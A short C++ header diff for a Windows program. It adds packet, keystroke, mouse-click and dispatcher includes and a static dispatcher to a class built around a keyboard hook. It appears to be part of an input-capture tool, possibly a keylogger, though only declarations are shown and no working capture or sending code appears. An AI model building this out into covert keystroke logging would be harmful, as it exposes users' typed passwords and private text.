@@ -5,6 +5,11 @@
 # include <string>
 # include <Windows.h>
 
+# include "Dispatcher.hpp"
+# include "APacket.hpp"
+# include "KeyStroke.hpp"
+# include "MouseClick.hpp"
+
 # define KEYUP 0x80000000
 # define KEYDOWN 0x40000000
 
@@ -20,6 +25,7 @@ private:
 	static HHOOK		_hook;
 	static bool			_capsLock;
 	static bool			_maj;
+	static Dispatcher	_disp;
 };
 
 #endif
